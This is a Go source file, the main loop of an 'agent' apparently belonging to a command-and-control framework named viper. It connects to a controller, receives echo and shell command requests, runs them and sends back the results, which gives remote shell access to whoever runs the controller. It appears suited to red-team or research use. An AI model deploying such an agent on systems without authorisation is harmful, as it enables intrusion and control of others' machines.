package main

import (
	"flag"
	"log"
	"viper/agent/controller"
	"viper/agent/modules"
	pb "viper/protos/cmds"

	"google.golang.org/protobuf/proto"
)

var (
	addr = flag.String("addr", "localhost:50051", "The address to connect to.")
)

func main() {
	controller := controller.Controller{Addr: *addr}
	controller.Connect()
	for {
		cmdReq, err := controller.ReadCommandRequest()
		if err != nil {
			log.Printf("Failed to read command: %v", err)
		}
		var resp proto.Message
		switch cmdReq.Type {
		case pb.ECHO_CMD_TYPE:
			resp = modules.RunEchoCommand(cmdReq.GetEchoCommandRequest())
		case pb.SHELL_CMD_TYPE:
			resp = modules.RunShellCommand(cmdReq.GetShellCommandRequest())
		}
		err = controller.WriteCommandResponse(resp)
		if err != nil {
			log.Printf("Failed to write command response: %v", err)
		}
	}
}
